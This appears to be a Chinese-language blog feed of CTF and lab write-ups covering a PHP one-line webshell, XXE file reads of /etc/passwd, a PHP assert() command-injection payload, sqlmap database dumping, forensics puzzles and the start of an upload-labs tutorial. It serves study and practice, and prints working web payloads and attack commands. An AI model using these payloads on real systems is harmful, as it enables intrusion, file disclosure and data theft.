class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 21</span><br><span class="line"></span><br><span class="line">cmd=system(%27ls%27);</span><br></pre></td></tr></table></figure>

<p>一句话木马先分析到这里.</p>
<h4 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h4><p>由于线下赛的服务器在比赛结束后就关闭了, 很多题目也不方便复现.<br>主要说一下思路就好了</p>
<ul>
<li><p>web1<br>前面的一句话木马已经分析过了,<br>其修补漏洞的方法也很简单 : 直接删除木马文件, 一了百了.<br>除了上面的一句话漏洞, 还有针对finecms的任意文件读取漏洞<br>我认为这个漏洞的根源是url过滤不够严格<br>题目一开始的代码只替换<code>../</code>为<code></code>,<br>修补方式是, 循环替换<code>../</code>, 让不法分子无机可乘</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/welcome.png" alt title class>
                <p></p>
            </figure>
<p><del>这段代码, 我修的 (叉腰)</del></p>
</li>
<li><p>web2<br>在题目给的站的某处, 可以上传图片,<br>但是对文件格式的检测却很宽松.<br>保存着上传图片的地方也没有限制访问.<br>直接图片马走起安排.</p>
</li>
<li><p>至于pwn1和pwn2 , , , 打扰了打扰了</p>
</li>
</ul>
<h3 id="api调用-resolved"><a href="#api调用-resolved" class="headerlink" title="api调用(resolved)"></a><a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">api调用</a>(resolved)</h3><p>这道题利用的是xxe漏洞<br>那么<a href="https://www.freebuf.com/articles/web/177979.html" target="_blank" rel="noopener">什么是xxe漏洞呢?</a></p>
<blockquote>
<p>简单来说，XXE就是XML外部实体注入。当允许引用外部实体时，通过构造恶意内容，就可能导致任意文件读取、系统命令执行、内网端口探测、攻击内网网站等危害。</p>
</blockquote>
<p><font size="2">咳, 这说的一点也不简单啊(小声bb) </font><br>对着其中几个陌生的名词来学习下:</p>
<ul>
<li><p>XML : </p>
<blockquote>
<p>可扩展标记语言，标准通用标记语言的子集，是一种用于标记电子文件使其具有结构性的标记语言。</p>
</blockquote>
<p>  根据我自己的理解, 应该就是一种可以<strong>方便计算机理解</strong>的, 使<strong>内部数据具有清晰逻辑结构</strong>的一种<strong>标记语言</strong><br>  示例代码如下: </p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /vulnerable HTTP/1.1</span><br><span class="line">Host: www.test.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Referer: https://test.com/test.html</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 294</span><br><span class="line">Cookie: mycookie=cookies;</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>XML is the best!<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>语法上:<br>这段代码中定义了一个根元素–<code>catalog</code>, <code>id</code>是<code>core</code>的一个属性, <code>author</code>和<code>title</code>则是<code>core</code>的子元素, <code>core</code>是<code>catalog</code>的子元素</p>
</li>
<li><p>功能上:<br>注意看代码的开头部分, 是POST方法的<strong>Header</strong>. 所以其实这段代码本质上仍然是一个<strong>POST方法的http数据包</strong>, 本质上和我们之前分析的post|get数据包没区别. 其作用无非是向服务器提交一份数据而已. 至于怎么处理, 那就看服务端的程序是怎样的了</p>
<br>  </li>
</ul>
</li>
<li><p><strong>允许引用外部实体</strong> :<br>  不过, 如果是下面的这段代码, 就会成为所谓的恶意payload, 如下:</p>
  <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd" &gt;]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">catalog</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">core</span> <span class="attr">id</span>=<span class="string">"test101"</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">author</span>&gt;</span>John, Doe<span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">title</span>&gt;</span>I love XML<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">category</span>&gt;</span>Computers<span class="tag">&lt;/<span class="name">category</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">price</span>&gt;</span>9.99<span class="tag">&lt;/<span class="name">price</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">date</span>&gt;</span>2018-10-01<span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">description</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">core</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">catalog</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>  这段代码与上面的只有两行不一样</p>
<ul>
<li><p><code>&lt;!DOCTYPE GVI [&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot; &gt;]&gt;</code></p>
</li>
<li><p><code>&lt;description&gt;&amp;xxe;&lt;/description&gt;</code><br>其中<code>&amp;xxe</code>就是恶意引用了外部的文件(实体):<code>file:///etc/passwd</code></p>
<br>
这份数据包如果发送给服务器, 代码被解释并返回

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;error&quot;: &quot;no results for description root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync...&#125;</span><br></pre></td></tr></table></figure>

<p>“无意”中就把文件的内容泄漏出来了.</p>
<br>
以上就是通过直接DTD外部实体声明实现的xxe. 理论上可以实现任意文件读取.

<p>不过这一切的前提是, <strong>允许对外部实体的引用</strong></p>
</li>
</ul>
</li>
</ul>
<p>好的, 前期知识基础的铺垫就先这么多.<br>回到刚才的题目上来, 我们查看下index.php的源代码, 有这么一段 js 代码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">XHR</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">var</span> xhr;</span><br><span class="line">        <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> XMLHttpRequest();&#125;</span><br><span class="line">        <span class="keyword">catch</span>(e) &#123;</span><br><span class="line">            <span class="keyword">var</span> IEXHRVers =[<span class="string">"Msxml3.XMLHTTP"</span>,<span class="string">"Msxml2.XMLHTTP"</span>,<span class="string">"Microsoft.XMLHTTP"</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>,len=IEXHRVers.length;i&lt; len;i++) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;xhr = <span class="keyword">new</span> ActiveXObject(IEXHRVers[i]);&#125;</span><br><span class="line">                <span class="keyword">catch</span>(e) &#123;<span class="keyword">continue</span>;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> xhr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"> evil_input = <span class="built_in">document</span>.getElementById(<span class="string">"evil-input"</span>).value;</span><br><span class="line"> <span class="keyword">var</span> xhr = XHR();</span><br><span class="line">     xhr.open(<span class="string">"post"</span>,<span class="string">"/api/v1.0/try"</span>,<span class="literal">true</span>);</span><br><span class="line">     xhr.onreadystatechange = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">         <span class="keyword">if</span> (xhr.readyState==<span class="number">4</span> &amp;&amp; xhr.status==<span class="number">201</span>) &#123;</span><br><span class="line">             data = <span class="built_in">JSON</span>.parse(xhr.responseText);</span><br><span class="line">             tip_area = <span class="built_in">document</span>.getElementById(<span class="string">"tip-area"</span>);</span><br><span class="line">             tip_area.value = data.task.search+data.task.value;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line">     xhr.setRequestHeader(<span class="string">"Content-Type"</span>,<span class="string">"application/json"</span>);</span><br><span class="line">     xhr.send(<span class="string">'&#123;"search":"'</span>+evil_input+<span class="string">'","value":"own"&#125;'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>emmm, 这段代码有太多我陌生的方法了(主要是因为没学过js), 全面的理解对解题来说性价比太低了.<br>不过如果能捕捉到其中的关键字<code>XML</code>我想对解题应该能起到一个很好的提示作用吧.<br>总之, 假设我们现在已经知道这道题目是有xxe漏洞的, 那么就可以用刚才的方法读取flag文件!<br><br><br>点击题目的那个<code>GO</code><br>用<code>Burp Suite</code>抓包. 发现是<code>POST</code>方法, body中有一段json格式的代码. 弃之.<br>我们要传xml的数据.<br>所以首先把<code>Content-Type</code>改成<code>application/xml</code><br>再在<code>body</code>中构造如下payload</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE abcd[</span></span><br><span class="line"><span class="meta">&lt;!ENTITY any SYSTEM "file:///home/ctf/flag.txt"&gt;]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">something</span>&gt;</span>&amp;any;<span class="tag">&lt;/<span class="name">something</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>最终效果图 :</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/xxe.png" alt title class>
                <p></p>
            </figure>
<p>ojbk.</p>
<p>###<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5002" target="_blank" rel="noopener">mfw</a>(resolved)</p>
<p>在题目中看到了出题者使用了Git, 可以猜测是Source Leak, 使用GitHack脚本, 能下载部分源代码.</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/GitHack.png" alt title class>
                <p></p>
            </figure>

<p>其实一开始以为要用目录扫描工具, 顺便记录下目录扫描的方法, 可以用Kali自带的<code>dirbuster</code>, 也可以用Github上的开源工具<code>dirsearch</code>.<br>这里推荐用后者, 因为它简单易用且十分强大.<br><strong>使用方法</strong> : <code>python dirsearch.py -u [URL] -e *</code></p>
<p>言归正传<br>在下载下的目录中看到有个<code>\templates\flag.php</code>, 进去后写着TODO, 这其实给了我们提示, <strong>要想办法读取这个flag.php</strong>.</p>
<p>再来审计index.php的代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>])) &#123;</span><br><span class="line">	$page = $_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	$page = <span class="string">"home"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file = <span class="string">"templates/"</span> . $page . <span class="string">".php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard '..' is dangerous!</span></span><br><span class="line">assert(<span class="string">"strpos('$file', '..') === false"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line">assert(<span class="string">"file_exists('$file')"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"That file doesn't exist!"</span>);</span><br></pre></td></tr></table></figure>

<p>直接上构造好的payload:<code>&#39;,&#39;yjn&#39;) or system(&#39;cat ./templates/flag.php&#39;);//</code></p>
<p>把我们的payload代入进去:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$page = <span class="string">"','yjn') or system('cat ./templates/flag.php');//"</span>;</span><br><span class="line">$file = templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php</span></span><br><span class="line"><span class="string">assert("strpos('</span>templates/<span class="string">','</span>yjn<span class="string">') or system('</span>cat ./templates/flag.php<span class="string">');//.php'</span>, <span class="string">'..'</span>) === <span class="keyword">false</span><span class="string">") or die("</span>Detected hacking attempt!<span class="string">");</span></span><br></pre></td></tr></table></figure>

<p>值得注意的是, <code>//</code>在这里起到了注释的作用, 但是只注释到assert的括号内.<br>所以这条语句就成了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert(<span class="string">"strpos('templates/','yjn') or system('cat ./templates/flag.php');"</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>

<p>再把<code>assert()</code>去除掉</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strpos(<span class="string">'templates/'</span>,<span class="string">'yjn'</span>) <span class="keyword">or</span> </span><br><span class="line">system(<span class="string">'cat ./templates/flag.php'</span>) <span class="keyword">or</span> </span><br><span class="line"><span class="keyword">die</span>(<span class="string">"Detected hacking attempt!"</span>);</span><br></pre></td></tr></table></figure>

<p>这条语句由三个小语句组成, 并用<code>or</code>连接了起来, 依此编号 1 2 3.<br>那么, 为了得到flag, 我们希望执行<code>语句2</code>,而不希望执行其它语句.<br>所以这里其实是利用了<code>or</code>的<code>短路效应</code>.</p>
<ul>
<li><code>语句1</code> : <code>strpos()</code>函数为查找字串, 但是显然<code>templates/flag.php</code>中没有<code>yjn</code>这个子串, 所以会有个返回值0. <code>or</code>会继续往下执行.</li>
<li><code>语句2</code> : 使系统执行命令<code>cat ./templates/flag.php</code>, 这条命令不光会让我们成功的拿到了flag, 还会返回<code>TRUE</code>, <code>or</code>就不会执行<code>语句3</code>. 如果命令执行不成功, 也会有个<code>FLASE</code>的返回值, 这曾一度给我很大的困扰.</li>
</ul>
<p>最终</p>
<figure class="image-box">
                <img src="http://188.131.227.20:999/picture/mfw.png" alt title class>
                <p></p>
            </figure>

<h3 id="NewCenter-solved"><a href="#NewCenter-solved" class="headerlink" title="NewCenter(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=4686" target="_blank" rel="noopener">NewCenter(solved)</a></h3><p>进入题目是个类似新闻网站的页面, 下面有个搜索框.<br>可以sql注入.<br>但是我现在的sql注入技术还是菜啊, 所以就用<code>sqlmap</code>吧, 记录下~</p>
<p>因为<code>sqlmap</code>要求<code>python2</code>运行, 所以我这里是用的<code>Kali</code>下自带的</p>
<p>首先把搜索的请求包抓取, 将其内容放进一个<code>txt</code>文件中</p>
<p>使用命令<code>sqlmap   -r 1.txt --dbs</code><br>可以将表的名字列出, 发现有个<code>news</code><br>再使用命令<code>sqlmap   -r 1.txt -D news --dump</code><br>就能将这个表的内容全部显示出来<br>get flag~</p>
<h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="ext3-solved"><a href="#ext3-solved" class="headerlink" title="ext3(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5098" target="_blank" rel="noopener">ext3(solved)</a></h3><ul>
<li>重点 :<ul>
<li>ext3 文件系统</li>
<li>strings</li>
<li>文件系统的挂载/卸载</li>
</ul>
</li>
</ul>
<p>附件是个名为<code>linux</code>的文件,<br>扔进 Linux 里,<code>file linux</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">linux: Linux rev 1.0 ext3 filesystem data, UUID=cf6d7bff-c377-403f-84ae-956ce3c99aaa (needs journal recovery)</span><br></pre></td></tr></table></figure>

<p>可以看出是Linux文件系统<code>ext3</code>, 我们要找的<code>flag</code>应该就藏在这个文件里</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# string linux | grep &apos;flag&apos;</span><br><span class="line">.flag.txt.swp</span><br><span class="line">flag.txtt.swx</span><br><span class="line">~root/Desktop/file/O7avZhikgKgbF/flag.txt</span><br></pre></td></tr></table></figure>

<p>但是要读取这个<code>flag.txt</code>,需要我们把文件系统挂载到Linux系统下.<br><code>mount linux /mnt</code><br>现在 <code>/mnt</code>目录就是挂载点.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@youjianing:~# cat /mnt/O7avZhikgKgbF/flag.txt</span><br><span class="line">ZmxhZ3tzYWpiY2lienNrampjbmJoc2J2Y2pianN6Y3N6Ymt6an0=</span><br></pre></td></tr></table></figure>

<p><code>base64</code> decode后就是flag<br>最后可以使用 <code>umount [挂载点]</code>来卸载文件系统.</p>
<h3 id="pdf-solved"><a href="#pdf-solved" class="headerlink" title="pdf(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5100" target="_blank" rel="noopener">pdf(solved)</a></h3><p>给了一个pdf文件, 里面只有一个图片, 估计flag就在这个图的下面.<br>扔进linux里, 用命令行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftotext pdf.pdf</span><br></pre></td></tr></table></figure>

<p>就会出现<code>pdf.text</code>, 里面有我们要的flag.<br>但是我不太明白为什么用<code>strings pdf.pdf | grep &#39;flag&#39;</code>不能找出flag.<br>姑且推测<code>pdf</code>文件中的文本在二进制格式中不是明文保存的.</p>
<h3 id="坚持60s-solved"><a href="#坚持60s-solved" class="headerlink" title="坚持60s(solved)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5103" target="_blank" rel="noopener">坚持60s(solved)</a></h3><blockquote>
<p>题目描述 : 菜狗发现最近菜猫不爱理他，反而迷上了菜鸡.</p>
</blockquote>
<p>菜猫为啥不喜欢菜狗呢? 难道是因为菜狗不能坚持60s吗 233</p>
<p>打开题目的文件, 是个java小游戏.<br>开心的玩耍了几次, 最好记录是31s. 距离60s还有很长的距离.<br>难道这就凉了吗?<br>不, 身为学计算机的, 要运用超能力.<br>使用java反编译工具<code>jd-gui.java</code>, 反编译后出现需要的flag.</p>
<h3 id="SimpleRAR-struct"><a href="#SimpleRAR-struct" class="headerlink" title="SimpleRAR(struct)"></a><a href="https://adworld.xctf.org.cn/task/answer?type=misc&number=1&grade=0&id=5102" target="_blank" rel="noopener">SimpleRAR(struct)</a></h3><p>别人的wp中说是png的文件头错了,<br>但是我按照他们说的修改了后, 仍然没法复现.<br>暂时存疑</p>
]]></content>
      
        
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 随笔 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[上传漏洞]]></title>
      <url>/2019/07/08/%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
      <content type="html"><![CDATA[<h1 id="上传漏洞"><a href="#上传漏洞" class="headerlink" title="上传漏洞"></a>上传漏洞</h1><h2 id="准备阶段"><a href="#准备阶段" class="headerlink" title="准备阶段"></a>准备阶段</h2><ol>
<li>阅读了GitHub上的<a href="https://github.com/c0ny1/upload-labs/blob/master/README.md#11-%E4%B8%BB%E7%95%8C%E9%9D%A2" target="_blank" rel="noopener">项目文档</a>后，稍微心里有了点数。<br>迅速clone了项目的代码后，发现是php文件，想运行要先部署环境</li>
</ol>
<ul>
<li>Windows下：<br>  推荐<a href="http://phpstudy.php.cn/download.html" target="_blank" rel="noopener">PHPStudy程序包</a>，集成了<code>Apache</code>+<code>PHP</code>+<code>MySQL</code>+<code>phpMyAdmin</code>+<code>ZendOptimizer</code>，一键安装，傻瓜式操作。</li>
<li>Linux下：<br>  我的服务器已经提前装好了<code>Apache</code>+<code>MySQL</code>+<code>phpMyAdmin</code>，可以参考我搭建服务器环境时的教程<a href="https://cloud.tencent.com/developer/labs/lab/10122" target="_blank" rel="noopener">https://cloud.tencent.com/developer/labs/lab/10122</a></li>
</ul>
<ol start="2">
<li>安装好 PHPStudy 后，找到网站根目录后，把项目的.php文件放入此目录。linux同理。<br> 打开浏览器，输入<a href="http:localhost/upload-labs-master" target="_blank" rel="noopener">http:localhost/upload-labs-master</a>,能显示被解析后的php文件，说明环境已经配置好了。</li>
</ol>
<h2 id="知识铺垫"><a href="#知识铺垫" class="headerlink" title="知识铺垫"></a>知识铺垫</h2><p>其实一直以来我对网页的运作方式也是一直半解， <code>PHP</code>,<code>JavaScript</code>,<code>HTML</code>,<code>css</code>什么的傻傻分不清楚,和别人聊起的时候也是一头雾水. 直到前几天刚刚把这个博客真正搭起来，才对<code>HTML</code>和<code>PHP</code>的关系有点理解了. 今天为了后面的学习, 有必要把这部分的知识好好补习下了.<br>主要参考:<a href="https://blog.csdn.net/qq_41147260/article/details/80840298" target="_blank" rel="noopener">你知道HTML、CSS、JS、Services、PHP、ASP.NET 是什么来头么？</a></p>
<p>###HTML<br><code>HTML</code>主要作用于前端(浏览器处).  以我个人的理解，<code>HTML</code>就好像是个成品,是可以直接被浏览器理解的文件. 当自己的电脑得到一个 <code>html</code>页面之后，就会对它进行解析。<code>HTML</code> 就是一种超文本标记语言。</p>
<p>###PHP<br>与<code>HTML</code>相对应, <code>PHP</code>主要应用于服务器端,主要用来写服务器脚本.其实<code>PHP</code>写成的服务器脚本本质上就是个程序, 而且是专门==处理客户端传来的数据、调用本地数据最后生成<code>HTML</code>文件的程序==。这一点上,<code>PHP</code>写成的服务器脚本就好像是个<code>HTML</code>的生成器. 当然, 服务器可以直接把预先设计好的成品<code>HTML</code>丢给客户端, 不过这样的灵活性就大大降低了, 每个人看到的同一个网页都是一模一样的, 而且网站也没法响应用户的其它请求.</p>
<p>###CSS<br>css可以对<code>html</code>网页进行渲染. 如果不用css，效果如下图，按照浏览器默认的样式显示出表格，超链接等。</p>
<figure class="image-box">
                <img src="http://p9.pstatp.com/large/47120003f1ab6a490727" alt title class>
                <p></p>
            </figure>
<p>(其实就是目前看我博客的效果……)<br>不说了, 我学css去了。(溜)</p>
<p>###Javascript<br> <code>Javascript（JS）</code>可以给页面添加一些动态的效果，比如头条的发表的标签，鼠标移上去会弹出一个小窗口，这个就是 JS 实现的效果啦。<strong>浏览器</strong>拿到这样的代码，<strong>就会解析并实现</strong>出相应的效果。且由黑字可知, JavaScript是运行在浏览器上的, 不涉及服务器.<br> 其实用来写浏览器脚本的，也不是非得JavaScript 不可，不过是各大浏览器都默认了：请用 JS 写这些动态效果的代码给我解析~</p>
<h3 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h3><blockquote>
<p>webshell就是以asp、php、jsp或者cgi等网页文件形式存在的一种命令执行环境，也可以将其称做为一种网页后门。黑客在入侵了一个网站后，通常会将asp或php后门文件与网站服务器WEB目录下正常的网页文件混在一起，然后就可以使用浏览器来访问asp或者php后门，得到一个命令执行环境，以达到控制网站服务器的目的。<br>顾名思义，“web”的含义是显然需要服务器开放web服务，“shell”的含义是取得对服务器某种程度上操作权限。webshell常常被称为入侵者通过网站端口对网站服务器的某种程度上操作的权限。由于webshell其大多是以动态脚本的形式出现，也有人称之为网站的后门工具。</p>
</blockquote>
<p>看不懂, 不过应该也没关系, 随着下面的题目应该会对这些概念有更加清晰的认识, 不妨带着问题, 开启学习之路.</p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结:"></a>小结:</h3><ul>
<li>HTML负责放你需要显示的内容，</li>
<li>PHP可以输出可变化的HTML。</li>
<li>CSS可以让你的HTML更加的漂亮，比如加字体颜色加边框。</li>
<li>JS可以让你HTML+CSS组成的页面更加“生动”,粗浅的来说就是JS让页面会动。</li>
<li>webshell是以网页文件形式存在的一种命令执行环境</li>
</ul>
<h2 id="二十题题解"><a href="#二十题题解" class="headerlink" title="二十题题解"></a>二十题题解</h2><h3 id="pass1"><a href="#pass1" class="headerlink" title="pass1:"></a>pass1:</h3><p>由提示</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/pass1tip.png" alt title class>
                <p></p>
            </figure>
<p>根据上面的介绍, JavaScript只会在浏览器中运行, 所以我们在浏览器中禁用掉JavaScript就行了.<br>以chrome浏览器为例.<br>首先在pass1的页面下,点击<code>F12</code>,调出开发者工具.</p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/开发者工具.png" alt title class>
                <p></p>
            </figure>
<p>然后点击<code>F1</code>,打开<code>settings</code></p>
<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/setting.png" alt title class>
                <p></p>
            </figure>
<p>在<code>setting</code>的<code>Preferences</code>的末尾部分,有个<code>Disable JavaScript</code>,顾名思义,找的就是它了. 选中后就可以禁用JavaScript, 成功上传<code>php</code>类型的文件, 审查元素, 发现此处的图片是<code>test.php</code>, 说明成功了.</p>
<h3 id="pass2"><a href="#pass2" class="headerlink" title="pass2:"></a>pass2:</h3><p>尝试直接提交test.php, 显示文件类型不匹配.<br>查看下提示<figure class="image-box">
                <img src="http://pub54dbxm.bkt.clouddn.com/pass2tips.png" alt title class>
                <p></p>
            </figure></p>
<p>好了, 什么是MIME呢?</p>
<blockquote>
